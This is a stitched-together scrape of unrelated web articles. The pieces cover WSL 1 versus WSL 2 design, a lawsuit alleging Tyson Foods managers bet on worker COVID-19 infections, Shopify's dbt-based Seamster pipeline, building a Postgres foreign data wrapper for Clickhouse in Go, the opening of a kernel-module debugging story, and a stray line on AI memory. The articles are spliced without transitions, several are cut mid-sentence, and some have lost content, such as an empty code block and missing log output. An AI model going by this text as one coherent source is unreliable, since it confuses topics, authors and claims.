<p>What this means is that the beauty of the WSL 1 design is gone: the Windows NT kernel doesn’t get to see anything that happens within the Linux world any more. All it knows is that there is a big black box that does “stuff” inside, and all it gets to see are the <code>VMENTER</code> and <code>VMEXIT</code> hook points for virtual machines and block-level read/write requests on a virtual disk. The NT kernel is now unaware of Linux processes and file accesses. Similarly, the Linux kernel is unaware of anything in NT land.</p>
<p>You can read about some more differences in the <a href="https://docs.microsoft.com/en-us/windows/wsl/compare-versions">official documentation</a>.</p>

<p>From the user’s point of view, WSL 2 feels strictly better: Linux apps now run much, much faster because they are not subject to awkward Linux system call “emulation” within the NT kernel. If using NTFS with Linux semantics is difficult, that’s no problem because the Linux environment now uses ext4 on a virtual disk. And support for Linux apps can be much more complete, because, well, WSL 2 <em>is</em> Linux: if you want FUSE, to name something, you got it.</p>
<p>But this comes at the cost <em>of what WSL could have been</em>:</p>
<ul>
<li>Can you imagine how cool it would be if you could type <code>ps</code> or <code>top</code> within a WSL session and see Linux <em>and</em> Windows processes side-by-side, able to mutate their state with <code>kill</code>?</li>
<li>Can you imagine how cool it would be to manipulate Windows services from the WSL session?</li>
<li>Can you imagine how cool it would be if you could use <code>ifconfig</code> (wait, is that <code>ip</code>? 🙄) within a WSL session to inspect and modify the machine’s network interfaces?</li>
<li>Essentially, can you imagine doing all of your Windows system administration tasks from within WSL?</li>
</ul>
<p>Although this never existed, I can well imagine such a world… and it’s one that <em>only the WSL 1 design can provide</em>. And the reason I can imagine this is because macOS gives you this model (albeit cheating because macOS is essentially Unix).</p>
<p>Which is what brings me to my frustration: even though I could install WSL on my development machine for Azure, there is nothing I can use it for. I still have to interact with the system via <code>CMD.EXE</code> because I have to deal with Windows-native processes and resources, and because the tooling I have to deal with is Windows-only.</p>
<p>The FAQ for WSL 2 claims that <a href="https://docs.microsoft.com/en-us/windows/wsl/wsl2-faq#what-will-happen-to-wsl-1-will-it-be-abandoned">WSL 1 will not be abandoned</a>, and if we abide by Microsoft’s backwards-compatibility guarantee, that may be true. But keeping WSL 1 running is a monumental effort due to the need to keep up with Linux changes. Regardless, I hope that this is the case and that WSL 1 continues to exist. Who knows, maybe the reason WSL 1 stays behind is to pursue this magical world I’m describing? 🤔</p>

<p>I can’t finish this post without talking about the various BSDs. The BSDs, always trailing behind Linux and other commercial operating systems, have had binary-level compatibility for ages. The earliest I can find is Linux compatibility in the NetBSD kernel back in 1995. That’s 25 years ago, and 21 before WSL 1’s first debut.</p>
<p>And, heck, this isn’t limited to Linux. NetBSD has had support to emulate <em>various</em> different operating systems throughout the years. SVR4 support appeared in 1994 and, for a brief stint, <a href="https://man.netbsd.org/NetBSD-5.0/compat_pecoff.8">NetBSD even had support for… 🥁… PE/COFF binaries</a>—that’s right, Win32 binaries. So, in a way, NetBSD implemented the WSL 1 model in reverse: it let you run Win32 binaries atop the NetBSD kernel back in 2002.</p>

        <p>A wrongful death lawsuit tied to COVID-19 infections in a Waterloo pork processing plant alleges that during the initial stages of the pandemic, Tyson Foods ordered employees to report for work while supervisors privately wagered money on the number of workers who would be sickened by the deadly virus.</p>
<p>Earlier this year, the family of the late Isidro Fernandez sued the meatpacking company, alleging Fernandez was exposed to the coronavirus at the Waterloo plant where he worked. The lawsuit alleges Tyson Foods is guilty of a “willful and wanton disregard for workplace safety.”</p>
<p>In a written statement issued Thursday afternoon, Tyson Foods’ president and chief executive officer, Dean Banks, said: “We are extremely upset about the accusations involving some of the leadership at our Waterloo plant. Tyson Foods is a family company with 139,000 team members and these allegations do not represent who we are, or our core values and team behaviors. We expect every team member at Tyson Foods to operate with the utmost integrity and care in everything we do.</p>
<p>“We have suspended, without pay, the individuals allegedly involved and have retained the law firm Covington &amp; Burling LLP to conduct an independent investigation led by former Attorney General Eric Holder. If these claims are confirmed, we’ll take all measures necessary to root out and remove this disturbing behavior from our company.</p>
<p>“Our top priority is and remains the health and safety of our team members.”</p>
<p>Fernandez, who died on April 20, was one of at least five Waterloo plant employees who died of the virus. According to the Black Hawk County Health Department, more than 1,000 workers at the plant — over a third of the facility’s workforce — contracted the virus.</p>
<p>The lawsuit alleges that despite the uncontrolled spread of the virus at the plant, Tyson required its employees to work long hours in cramped conditions without providing the appropriate personal protective equipment and without ensuring workplace-safety measures were followed.</p>
<p>The lawsuit was recently amended and includes a number of new allegations against the company and plant officials. Among them:</p>
<ul>
<li>In mid-April, around the time Black Hawk County Sherriff Tony Thompson visited the plant and reported the working conditions there “shook [him] to the core,” plant manager Tom Hart organized a cash-buy-in, winner-take-all, betting pool for supervisors and managers to wager how many plant employees would test positive for COVID-19.</li>
<li>John Casey, an upper-level manager at the plant, is alleged to have explicitly directed supervisors to ignore symptoms of COVID-19, telling them to show up to work even if they were exhibiting symptoms of the virus. Casey reportedly referred to COVID-19 as the “glorified flu” and told workers not to worry about it because “it’s not a big deal” and “everyone is going to get it.” On one occasion, Casey intercepted a sick supervisor who was on his way to be tested and ordered him to get back to work, saying, “We all have symptoms — you have a job to do.” After one employee vomited on the production line, managers reportedly allowed the man to continue working and then return to work the next day.</li>
<li>In late March or early April, as the pandemic spread across Iowa, managers at the Waterloo plant reportedly began avoiding the plant floor for fear of contracting the virus. As a result, they increasingly delegated managerial authority and responsibilities to low-level supervisors who had no management training or experience. The supervisors did not require truck drivers and subcontractors to have their temperatures checked before entering the plant.</li>
<li>In March and April, plant supervisors falsely denied the existence of any confirmed cases or positive tests for COVID-19 within the plant, and allegedly told workers they had a responsibility to keep working to ensure Americans didn’t go hungry as the result of a shutdown.</li>
<li>Tyson paid out $500 “thank you bonuses” to employees who turned up for every scheduled shift for three months — a policy decision that allegedly incentivized sick workers to continue reporting for work.</li>
<li>Tyson executives allegedly lobbied Iowa Gov. Kim Reynolds for COVID-19 liability protections that would shield the company from lawsuits, and successfully lobbied the governor to declare that only the state government, not local governments, had the authority to close businesses in response to the pandemic.</li>
</ul>
<p>While Tyson has yet to file a formal response to the new allegations, it has said in previous court filings that it “vigorously disputes” the plaintiffs’ claims and has “invested millions of dollars to provide employees with safety and risk-mitigation equipment.”</p>
<p>The lawsuit claims that while Tyson has repeatedly claimed that its operations needed to remain open to feed America, the company increased its exports to China by 600% during the first quarter of 2020.</p>
<p>The lawsuit is seeking unspecified damages for fraudulent misrepresentation and gross negligence.</p>
<p>The case was initially filed in state court, claiming violations of Iowa law. At Tyson’s request, the case was moved to federal court, with the company claiming it had remained open during the pandemic “at the direction of a federal officer” — President Donald Trump, who, on April 28, invoked his authority under the <a href="https://iowacapitaldispatch.com/2020/05/04/trumps-critics-warn-his-order-to-keep-meat-plants-open-imperils-workers/">Defense Production Act</a> and ordered meat and poultry processing companies to continue operating.</p>
<p>The nonprofit organization Public Citizen has filed an amicus brief in the case, supporting the Fernandez family’s efforts to remand the action back to state court. In its brief, Public Citizen has said that neither the Defense Production Act nor the executive order signed by President Trump had “directed” Tyson to do anything.</p>
<p>The Waterloo facility is Tyson’s largest pork plant in the United States. The facility employs approximately 2,800 workers who process approximately 19,500 hogs per day.</p>

  <p><strong>By Michelle Ark and Chris Wu</strong></p>
<p>In January of 2014, Shopify built a data pipeline platform for the data science team called Starscream. Back then, we were a smaller team and needed a tool that could deal with everything from ad hoc explorations to machine learning models. We chose to build with PySpark to get the power of a generalized distributed computer platform, the backing of the industry standard, and the ability to tap into the Python talent market.&nbsp;</p>
<p>Fast forward six years and our data needs have changed. Starscream now runs 76,000 jobs and writes 300 terabytes a day! As we grew, some types of work went away, but others (like simple reports) became so commonplace we do them every day. While our Python tool based on PySpark was computationally powerful, it wasn’t optimized for these commonplace tasks. If a product manager needed a simple rollup for a new feature by country, pulling it, and modeling it wasn’t a fast task.</p>
<p>We’ll show you how we moved to a SQL modelling workflow by leveraging <a href="https://www.getdbt.com/" target="_blank" title="Analytics engineering is the data transformation work that happens between loading data into your warehouse and analyzing it. dbt allows anyone comfortable with SQL to own that workflow." rel="nofollow noopener noreferrer">dbt</a> (data build tool) and created tooling for testing and documentation on top of it. All together, these features provide Shopify’s data scientists with a robust, production-ready workflow to quickly build straightforward pipelines.</p>

<p>When we interviewed our users to understand their workflow on Starscream, there were two issues we discovered: <em>development time</em> and <em>thinking</em>.</p>
<p><em>Development time</em> encompasses the time data scientists use to prototype the data model they’d like to build, run it, see the outcome,and iterate. The PySpark platform isn’t ideal for running straightforward reporting tasks, often forcing data scientists to write boilerplate and it yields long runtimes. This led to long iteration cycles when trying to build models on unfamiliar data.</p>
<p>The second issue, <em>thinking</em>, is more subtle and deals with the way the programming language forces you to look at the data. Many of our data scientists prefer SQL to python because its structure forces consistency in business metrics. When interviewing users, we found a majority would write out a query in SQL then translate it to Python when prototyping. Unfortunately, query translation is time consuming and doesn’t add value to the pipeline.</p>
<p>To understand how widespread these problems were, we audited the jobs run and surveyed our data science team for the use cases. We found that 70% or so of the PySpark jobs on Starscream were full batch queries that didn’t require generalized computing. We viewed this as an opportunity to make a kickass optimization for a painful workflow.&nbsp;</p>

<p>Our goal was to create a SQL pipeline for reporting that enables data scientists to create simple reporting data faster, while still being production ready. After exploring a few alternatives, we felt that the dbt library came closest to our needs. Their tagline “deploy analytics code faster with software engineering practices” was <em>exactly</em> what we were looking for in a workflow. We opted to pair it with Google BigQuery as our data store and dubbed the system and its tools, Seamster.</p>
<p>We knew that any off-the-shelf system wouldn’t be one size fits all. In moving to dbt, we had to implement our own:</p>
<ul>
<li>source and model structure to modularize data model development</li>
<li>unit testing to increase the types of testable errors</li>
<li>continuous integration (CI) pipelines to provide safety and consistency guarantees.</li>
</ul>
<h2>Source Independence and Safety</h2>
<p>With dozens of data scientists making data models in a shared repository, a great user experience would</p>
<ul>
<li>maximize focus on work&nbsp;</li>
<li>minimize the impact of model changes by other data scientists.</li>
</ul>
<p>By default, dbt declares raw sources in a central <code>sources.yml</code>. This quickly became a very large file as it included the schema for each source, in addition to the source name. It creates a huge bottleneck for teams editing the same file across multiple PRs.&nbsp;</p>

<p>To mitigate the bottleneck, we leveraged the flexibility of dbt and created a top-level ‘sources’ directory to represent each raw source with its own source-formatted yaml file. This way, data scientists can parse only the source documentation that’s relevant for them and contribute to the <code>sources.yml</code> file without stepping on each other’s toes.</p>

<p><em>Base models are one-to-one interfaces to raw sources.</em></p>
<p>We also created a Base layer of models using the <a href="https://discourse.getdbt.com/t/how-we-structure-our-dbt-projects/355" target="_blank" rel="nofollow noopener noreferrer">‘</a><a href="https://discourse.getdbt.com/t/how-we-structure-our-dbt-projects/355" target="_blank" title="How we structure our dbt projects" rel="nofollow noopener noreferrer">staging’ concept from dbt</a> to implement their best practice of <a href="https://docs.getdbt.com/docs/guides/best-practices/#limit-references-to-raw-data" target="_blank" title="Limit references to raw data - dbt" rel="nofollow noopener noreferrer">limiting references to raw data</a>. Our Base models serve as a one-to-one interface to raw sources. They don’t change the grain of the raw source, but do apply renaming, recasting, or any other cleaning operation that relates to the source data collection system.&nbsp;</p>
<p>The Base layer serves to protect users from breaking changes in raw sources. Raw external sources are by definition out of the control of Seamster and can introduce breaking changes for any number of reasons at any point in time. If and when this happens, you only need to apply the fix to the Base model representing the raw source, as opposed to every individual downstream model that depends on the raw source.&nbsp;</p>
<h2>Model Ownership for Teams</h2>
<p>We knew that the tooling improvements of Seamster would be only one part of a greater data platform at Shopify. We wanted to make sure we’re providing mechanisms to support good dimensional modelling practices and support data discovery.</p>
<p>In dbt, a model is simply a .sql file. We’ve extended this definition in Seamster to define a model as a directory consisting of four files:&nbsp;</p>
<ul>
<li><code>model_name.sql</code></li>
<li><code>schema.yml</code></li>
<li><code>README.md</code></li>
<li><code>test_model_name.py</code></li>
</ul>
<p>You can further organize models into directories that indicate a data science team at Shopify like ‘finance’ or ‘marketing’.&nbsp;</p>
<p>To support a clean data warehouse we’ve also organized data models into these rough layers that differentiate between:</p>
<ul>
<li>
<strong>base</strong>: data models that are one-to-one with raw data, but cleaned, recast and renamed</li>
<li>
<strong>application-ready</strong>: data that isn’t dimensionally modelled but still transformed and clean for consumption by another tool (for example,&nbsp; training data for a machine learning algorithm)</li>
<li>
<strong>presentation</strong>: shareable and reliable data models that follow dimensional modelling best practices and can be used by data scientists across different domains.</li>
</ul>
<p>With these two changes, a data consumer can quickly understand the data quality they can expect from a model and find the owner in case there is an issue. We also pass this metadata upstream to <a href="https://shopify.engineering/solving-data-discovery-challenges-shopify" target="_blank" title="How We’re Solving Data Discovery Challenges at Shopify" rel="nofollow noopener noreferrer">other tools</a> to help with the data discovery workflow.</p>
<h2>More Tests</h2>
<p>dbt has native support for ‘schema tests’, which are encoded in a model’s schema.yml file. These tests run against production data to validate data invariants, such as the presence of null values or the uniqueness of a particular key. This feature in dbt serves its purpose well, but we also want to enable data scientists to write unit tests for models that run against fixed input data (as opposed to production data).</p>
<p>Testing on fixed inputs allows the user to test edge cases that may not be in production yet. In larger organizations, there can and will be frequent updates and many collaborators for a single model. Unit tests give users confidence that the changes they’re making won’t break existing behaviour or introduce regressions.&nbsp;</p>
<p>Seamster provides a Python-based unit testing framework. Data scientists write their unit tests in the <code>test_model_name.py</code> file in the model directory. The framework enables constructing ‘mock’ input models from fixed data. The central object in this framework is a ‘mock’ data model, which has an underlying representation of a Pandas dataframe. You can pass fixed data to the mock constructor as either a csv-style string, Pandas dataframe, or a list of dictionaries to specify input data.&nbsp;</p>
<p><img alt="Input and expected MockModels are built from static data. The actual MockModel is built from input MockModels by BigQuery. Actual and expected MockModels can assert equality or any Great Expectations expectation" data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/input-expected-mock-models.jpg?v=1605811967" src="https://cdn.shopify.com/s/files/1/0779/4361/files/input-expected-mock-models.jpg?v=1605811967"><br><em>Input and expected MockModels are built from static data. The actual MockModel is built from input MockModels by BigQuery. Actual and expected MockModels can assert equality or any Great Expectations expectation.</em></p>
<p>A constructor creates a test query where a common table expression (CTE) represents each input mock data model, and any references to production models (identified using dbt’s ‘ref’ macro) are replaced by references to the corresponding CTE. Once you execute a query, you can compare the output to an expected result. In addition to an equality assertion, we extended our framework to support all expectations from the open-source <a href="https://github.com/great-expectations/great_expectations" target="_blank" title="Great Expectations - Always know what to expect from your data." rel="nofollow noopener noreferrer">Great Expectations</a> library to provide more granular assertions and error messaging.&nbsp;</p>
<p>The main downside to this framework is that it requires a roundtrip to the query engine to construct the test data model given a set of inputs. Even though the query itself is lightweight and processes only a handful of rows, these roundtrips to the engine add up. It becomes costly to run an entire test suite on each local or CI run. To solve this, we introduced tooling both in development and CI to run the minimal set of tests that could potentially break given the change. This was straightforward to implement with accuracy because of dbt’s lineage tracking support; we simply had to find all downstream models (direct and indirect) for each changed model and run their tests.&nbsp;</p>
<h2>Schema and Directed Acyclic Graph Validation on the Cheap</h2>
<p>Our objective in Seamster’s CI is to give data scientists peace of mind that their changes won’t introduce production errors the next time the warehouse is built. They shouldn’t have to wonder whether removing a column will cause downstream dependencies to break, or whether they made a small typo in their SQL model definition.</p>
<p>To achieve this accurately, we would need to build and tear down the entire warehouse on every commit. This isn’t feasible from both a time and cost perspective. Instead, on every commit we materialize every model as a view in a temporary BigQuery dataset which is created at the start of the validation process and removed as soon as the validation finishes. If we can’t build a view because its upstream model doesn’t provide a certain column, or if the SQL is invalid for any reason, BigQuery fails to build the view and …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				

<p><a href="https://www.postgresql.org/">Postgres</a>(hereinafter mentioned as PG) is a pretty cool database with lots of nice features, one of them little known ones is the ability of having Foreign data wrappers <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">(hereinafter mentioned as FDWs)</a>.</p>

<p><a href="https://clickhouse.tech/">Clickhouse</a>(hereinafter mentioned as CH) is another amazing database with an altogether different set of features targeted for OLAP use cases.</p>

<h2 id="what-are-foreign-data-wrappers-fdws-then">What are Foreign Data Wrappers (FDWs) then?</h2>

<p>Well unlike so many names in tech, we can actually infer some idea from the name itself in this case.
So FDWs in essence, allows to access <em>foreign</em> <em>data</em> sources inside Postgres(PG) via a set of <a href="https://www.postgresql.org/docs/current/fdwhandler.html">wrapper APIs</a>.</p>

<p>That is, you can access data sitting in a Mysql/SQlite/Clickhouse(<em>any other data source</em>) table inside PG as you would do for a normal PG table. Isn’t that amazing!</p>

<p>There are already numerous such FDWs. A list is available <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">here</a>.</p>

<p>One caveat is that the extent of features you can expect from a FDW is dependent on the particular implementation.
We can expect normal read support but other niceties like push-down filters, aggregations or joins, or write support can be missing.</p>

<h2 id="accessing-clickhouse-ch-via-postgres-pg">Accessing Clickhouse(CH) via Postgres(PG)</h2>

<p>Given the existence of so many possibilities of accessing other datastores, wouldn’t it be fun if we could access Clickhouse from inside Postgres.</p>

<p>Why would you want to do it! you may ask.</p>

<p>Well one reason could be of course, for <em>fun</em>.</p>

<p>But more realistically, one of the ambitious use cases at <a href="https://messagebird.com/">MessageBird</a>(my employer) was the ability to connect Clickhouse to <a href="https://looker.com/">Looker</a> as no direct integration existed at that time.
It was a bit of a moonshot but we decided to give it a try to see if it would work :)</p>

<p>MessageBird has generously made the full source for our experiment open source! The repository is available <a href="https://github.com/messagebird/clickhouse-postgres-fdw">here</a>.
So you can reference the ideas mentioned in the blog post directly in the code as well :)</p>

<h3 id="now-on-to-writing-one-fdw">Now on to writing one FDW!</h3>

<p>There are already <a href="https://www.postgresql.org/docs/current/fdwhandler.html">documentations</a> on how we should approach this and some simple examples are also available on Github. Most of the full fledged FDWs have their code in open so we can consult them as well.
Note that most of them are written in C becauses the FDW API of PG is in C, which makes sense.
I should highlight one particular <a href="https://github.com/pgspider/sqlite_fdw">FDW</a> that is made for SQLite and has a solid feature set, which helped me a lot while writing the one for Clickhouse.</p>

<p>But what if we want to be adventurous and write one in Go? Well, it should be possible given the existence of <a href="https://golang.org/cmd/cgo/">CGo</a>.</p>

<p>We can expect that it will not be at all trivial. ;)
There are already attempts on making Postgres Extensions in <a href="https://github.com/liztio/k8s-fdw">Go</a>, which gives a very valuable insight.</p>

<h4 id="setting-up-the-build-process-and-interaction-between-go-and-postgres-c-api">Setting up the build process and interaction between Go and Postgres C API</h4>

<p>First we should familiarize ourselves with the <a href="https://www.postgresql.org/docs/13/extend-pgxs.html">PG Extension Build Infrastructure/PGXS</a> and how to write <a href="https://www.postgresql.org/docs/current/xfunc-c.html#DFUNC">C code</a> for PG.
These are crucial as we would want to integrate the C code with Go, and knowing how the build process works should help us in understanding where our code will fit.</p>

<p>For writing a FDW we have to provide an entry point in form of a <code>struct</code> containing function pointers to the implemented callback functions.
Since we want to write those callback in Go, we can consult documentation for <a href="https://golang.org/cmd/cgo/#hdr-C_references_to_Go">accessing Go functions in C</a>, which says there are specific annotations that should allow us to export go functions outside to the C code.
All the important work is done in these callbacks only.<br>
Now it should be possible to add functions that PG FDW API expects via Go.</p>

<p>But, how will the C code find the callback functions written in Go land ? <a href="https://golang.org/cmd/go/#hdr-Build_modes">Go build modes</a> is the answer.
Directly referencing from the documentation, the <code>-buildmode=c-archive</code> allows us to:</p>

<pre><code>Build the listed main package, plus all packages it imports,
into a C archive file. The only callable symbols will be those
functions exported using a cgo //export comment. Requires
exactly one main package to be listed.
</code></pre>

<p>Perfect! Now, the exported Go functions are available in the <a href="https://linux.die.net/man/1/ar">archive file</a>.
The only remaining thing is to link the archive with C code during build.
Thankfully, <a href="https://www.postgresql.org/docs/13/extend-pgxs.html">PGXS</a> provides a <code>Make</code> variable <code>SHLIB_LINK</code> that can be used to set the shared library used. So we’ll use that flag to provide the archive build from Go source files.</p>

<p>You can see it in action <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/main/Makefile">here</a>.</p>

<!-- * how linking go code to c via statically linked libraries works ? .a files linking with Go. -->

<!-- And we want a library of sorts which should be callable inside C code. For this we can use go build mode (c-archive), this will create a statically linked archive(see difference btwn shared objects and statically linked libraries and how to build them) -->

<h4 id="understanding-inner-working-of-the-fdw-api-and-their-relation-with-different-query-stages">Understanding inner working of the FDW API and their relation with different Query Stages</h4>

<!-- * Figuring out which stages do what, what do you want and where to look for them -->

<p>To actually write a working FDW, we need to familiarize with the different stages a query goes through in PG and how the API functions play them out.
Postgres has an excellent documentation and moreover since all the <a href="https://github.com/messagebird/clickhouse-postgres-fdw/">source code</a> is open, we can just navigate through the code as well!</p>

<p>It would take more space than a blog post to explain the full internals of Query planner in Postgres and I probably can’t describe it well enough.
So, I suggest to go through <a href="https://www.postgresql.org/docs/current/fdw-callbacks.html">the official documentation</a> which is quite excellent and there are many other excellent references on the web.</p>

<p>I’ll try to briefly explain the flow of the API functions for the context of this post.
A very basic plan looks like this:</p>

</code></pre>

<p>There are other functions in the FDW API that I’ve omitted here (like <code>ReScanForeignScan</code>, <code>AnalyzeForeignTable</code>, <code>GetForeignUpperPaths</code>) but a basic FDW can be done with these.
Also note that this path is only concerned with the read queries. To enable writing on the foreign database, there are separate functions that need to be implemented.
You can see how the read path is implemented for our clickhouse FDW <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/main/ch_fdw.c">here</a>.</p>

<p>Important ones to take note of to properly implement the read path of a query are:</p>

<ul>
<li><p>GetForeignRelSize: It should be used to determine the estimated number of rows to be scanned on the foreign server. However, it is also used to extract the restriction clauses present in the query presented by PG and to pass them to the foreign server if it can support them.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L180">example</a>.</p></li>

<li><p>GetForeignPlan: It should return the planner node(a data structure that contains the query plan). However, it is also used to extract the target columns that can be fetched from remote/foreign servers and pass that info along with restriction clauses, table names to the next stage.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L275">example</a>.</p></li>

<li><p>BeginForeignScan: It should perform the initalization that is needed to perform the scan on the foreign server, for example: initialize the foreign DB connection, formalize the query running on foreign server and init the state with row iterator to be used in the next stage.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L508">example</a>.</p></li>

<li><p>IterateForeignScan: It should return a row from the foreign server converted to the PG specific structure. This function should convert the foreign server specific data types to PG column data types.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L620">example</a>.</p></li>

<li><p>EndForeignScan: It should clean the state being stored for the query, like row iterators, db connections should be closed.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L760">example</a>.</p></li>
</ul>

<p>This is a very dense overview of the functionality of a <em>basic</em> FDW. It usually helps to look around the other FDWs that are open source to look for ideas of a sample implementation. But it can differ since the foreign server can be of various types.
Usually, if we take databases that support some dialect of SQL then the hardest things are usually figuring out if the restriction clauses are remote safe, which can involve parsing the full expression clauses and then converting them to remote variants.
Converting the foreign server datatypes to PG types is comparatively easy but is very toiling.</p>

<p>You can look into how <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go">clickhouse FDW</a> does this to get an idea, but beware that it could be bug prone, since it hasn’t been tested thoroughly.</p>

<p>I’ll also suggest getting an idea of commonly used PG datatypes and conventions like <code>OID</code>, <code>Tuple</code>, <code>RelOptInfo</code> or just going over <a href="https://doxygen.postgresql.org/relation_8h.html"><code>relation.h</code></a> reference from PG source code.</p>

<h3 id="few-tips-and-tricks">Few Tips and Tricks</h3>

<p>These are some ideas that I’ve seen are fairly used while developing a FDW. Some can help in easy interop between Go and C, whether it is a good idea or not, is up for debate ;)</p>

<h4 id="interfacing-c-macros-within-go">Interfacing C macros within Go</h4>

<p>There are a lot of internal macros in PG source which makes it easier to access system cache, lists, heap tuples etc. which aren’t directly callable from Go’s userland.<br>
This is because CGo doesn’t quite allow directly calling C <code>#define</code> macros.<br>
You can try to simulate the same behaviour using underlying constructs but that can get hairy and cumbersome. Instead one <em>easy</em> idea is to define simple C wrapper functions like</p>

<pre><code>void *wrapper_access_list(void *list, int index){
	return access_list(list, index);
}
</code></pre>

<p>This can now be used directly on Go side. But make sure you cast the results to proper types.</p>

<h4 id="moving-out-c-code">Moving out C code</h4>

<p>There can be a point where writing C code directly in Go source files is not feasible …</p></div></div>

killed it.</p>

<p>In this post, I assume you have some understanding of how files and concurrency
work on Unix systems. I will try to explain everything else!</p>

<h2 id="a-nightmare-begins">A nightmare begins</h2>

<p>I have been working on building a <a href="https://reberhardt.com/blog/2019/12/12/generating-diagrams-for-teaching-multiprocessing.html">graphical debugger for C Playground</a> for
some time, allowing users to run code in the browser and visualize how their
program is being executed. As part of this work, I had to implement a kernel
module. (I’ll explain more about this project in the next section.) After
testing the code locally for a few months, I pushed it to production.</p>

<p>The next morning, I woke up to a text from my roommate: <em>“I think the server
crashed.”</em> Uh oh, that’s not supposed to happen. I quickly pulled out my laptop
and tried to SSH into the server to pull the logs, but to my surprise, I
couldn’t reach the server:</p>

<div><div><pre><code>ssh: connect to ... port 22: Operation timed out
</code></pre></div></div>

<p>Something wasn’t right. I logged into DigitalOcean to restart the machine, but
while I was doing that, I noticed a spike in the server’s CPU usage graph
around the time my roommate texted me. The CPU was cleanly pegged at 100%.
Normally, if a process running on the machine is hogging the CPU, we should
expect to see slight fluctuations around 100%, but that was not the case here
– it was a clean, horizontal line.</p>

<figure>
    <a href="https://reberhardt.com/blog//images/my-first-kernel-module/digitalocean-cpu-usage.png">
        <img src="https://reberhardt.com/blog//images/my-first-kernel-module/digitalocean-cpu-usage.png" alt="">
    </a>
    
</figure>

<p>After force-restarting the server via DigitalOcean and rolling back the
debugging feature, I started going through logs to get a sense for what
happened. My kernel module has print statements, and these get saved to the
kernel’s log in <code>/var/log/kern.log</code>. I scanned through this file, hoping to
find some clues, but this only confused me even more; there was <em>nothing</em> in
the kernel logs from any time near when the server locked up. It seemed to
suggest my kernel module wasn’t even running at that time. But I felt it <em>had</em>
to be a problem with my kernel module: nothing in user space could cause a
computer to lock up the way it did, completely unresponsive and pegged at 100%
CPU.</p>

<p>I kept digging. If the kernel logs didn’t give me anything helpful, maybe there
might be some application-side records that would indicate what happened.
However, when I checked the C Playground log file, I felt things only getting
worse:</p>

<p>What on earth is <em>that</em>???</p>

<p>After some Googling, I figured out that <code>^@</code> is how <code>less</code> displays null bytes.
So, my log file is filled with null bytes. Why would that be?</p>

<p>Then it occurred to me: Filesystem writes aren’t synchronous. When a program
writes to a file, the data is usually not immediately written to disk. Instead,
to improve performance, the data is written to a buffer in memory. Normally,
the kernel flushes this buffer to disk periodically, so that the data is
persisted. But if the kernel is incapacitated, there is no way the data can
reach the disk, and when the machine force-restarts, it is lost forever. From
the above output, I could see that parts of the logs made it to disk, but later
parts of the logs were not so lucky, appearing as scrambled null bytes instead.</p>

<p>I started to feel a sense of dread creeping in. This was reminding me of the
extremely late nights and brain-frying debugging sessions from that time I took
an operating systems class. Except this might be even worse: This problem is
<em>only</em> happening in production, and I can’t reproduce it, and I can’t get any
logs to explain what’s wrong.</p>

<p>In the next section, I’ll explain what my kernel module was doing, so that you
can follow along with my debugging process. Then, in the last section, I’ll
talk you through the long, long process I went through to identify the <em>two</em>
bugs that caused this problem. (Spoiler alert: there were two race conditions
that caused two use-after-frees, in which I attempted to use memory after it
had already been freed.)</p>

<h2 id="context-c-playground-visual-debugger">Context: C Playground Visual Debugger</h2>

<p>I have been working on <a href="https://cplayground.com/">C Playground</a> for some time,
which is an online sandbox for quickly testing out C and C++ code. It is
specifically designed for learning systems programming, and I have been working
on features that generate diagrams to illustrate what is happening under the
hood when you run code on a computer.</p>

<p>Most recently, I was working on generating diagrams of the data structures that
the kernel uses to keep track of a program’s open files. The context and
motivation for this are described in much more detail in <a href="https://reberhardt.com/blog/2019/12/12/generating-diagrams-for-teaching-multiprocessing.html">this blog
post</a>.
As a very brief summary, this feature aims to help students understand system
calls such as <code>open</code>, <code>close</code>, <code>dup2</code>, <code>fork</code>, <code>pipe</code>, and others. Using these
system calls requires an understanding of what they are doing on your behalf.
Usually, we explain these system calls in terms of the <em>vnode table</em>, which
caches information about files on the system, the <em>open file table</em>, which
stores <em>session</em> information (e.g. program X has file Y open for reading, and
has read 100 bytes so far), and the <em>file descriptor table</em>, which stores
pointers into the open file table indicating which sessions a process has open.</p>

<p>When teaching these concepts, we typically draw a lot of diagrams by hand. C
Playground aims to generate diagrams automatically, helping students to build
up and confirm their intuitions without needing access to a TA. The platform
allows students to set breakpoints and step through …</p></div></article></div></div></div>

There, the relationship is a transactional one with the AI only focused on solving an immediate request from you. Very little context is carried between interactions so they have no emotional intelligence, making them frustrating to interact with. Instead, we humans should be better represented within an AI’s brain. It should have memories of us and our conversations and continue that shared context into future conversations. It should anticipate us instead of just reacting to us. In short, what’s missing is that you should feel “seen”.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1605570854118_5574"><div>

